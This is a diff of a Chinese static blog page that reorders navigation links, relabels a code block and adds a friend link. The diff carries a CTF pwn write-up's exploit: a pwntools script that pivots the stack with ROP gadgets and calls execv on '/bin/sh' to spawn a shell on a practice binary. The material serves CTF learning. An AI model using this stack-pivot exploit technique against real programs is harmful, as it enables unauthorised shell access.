@@ -247,9 +247,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/archive/">
               
-              关于
+              归档
               
               
             </a>
@@ -258,9 +258,9 @@
           
           
           <li>
-            <a href="/tags/">
+            <a href="/about/">
               
-              标签
+              关于
               
               
             </a>
@@ -280,9 +280,9 @@
           
           
           <li>
-            <a href="/archive/">
+            <a href="/tags/">
               
-              归档
+              标签
               
               
             </a>
@@ -491,7 +491,7 @@ vul函数里有一次read用来劫持rbp、rsp<br>
 调试的时候可以看到一些关键的覆盖</p>
 <h1>exp</h1>
 <p>直接从nameless✌那里抄来的exp，懒狗懒得自己写了</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=remote(&#x27;124.222.96.143&#x27;,10000)</span></span><br><span class="line">io=process(<span class="string">&quot;./stackmove&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stackmove&#x27;</span>)<span class="comment">#io=process(&#x27;./b&#x27;)</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x400851</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400853</span></span><br><span class="line">lea_ret=<span class="number">0x400708</span></span><br><span class="line">stack_addr=<span class="number">0x600ca0</span></span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;global_buf:&#x27;)</span></span><br><span class="line"><span class="comment">#stack_addr=int(io.recv(8),16)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;execv:&#x27;</span>)</span><br><span class="line">execv_addr=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">payload1=p64(pop_rdi_ret)+p64(stack_addr)+p64(pop_rsi_r15_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execv_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;global:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input:&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span>+p64(stack_addr)+p64(lea_ret)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive( )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=remote(&#x27;124.222.96.143&#x27;,10000)</span></span><br><span class="line">io=process(<span class="string">&quot;./stackmove&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stackmove&#x27;</span>)<span class="comment">#io=process(&#x27;./b&#x27;)</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x400851</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400853</span></span><br><span class="line">lea_ret=<span class="number">0x400708</span></span><br><span class="line">stack_addr=<span class="number">0x600ca0</span></span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;global_buf:&#x27;)</span></span><br><span class="line"><span class="comment">#stack_addr=int(io.recv(8),16)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;execv:&#x27;</span>)</span><br><span class="line">execv_addr=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">payload1=p64(pop_rdi_ret)+p64(stack_addr)+p64(pop_rsi_r15_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execv_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;global:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input:&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span>+p64(stack_addr)+p64(lea_ret)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive( )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
         <hr>
         <!-- Pager -->
@@ -764,6 +764,10 @@ vul函数里有一次read用来劫持rbp、rsp<br>
           
           <li>
             <a href="https://www.korey0sh1.cn" target="_blank">korey0sh1</a>
+          </li>
+          
+          <li>
+            <a href="http://jian.pl/" target="_blank">小简</a>
           </li>
           
         </ul>
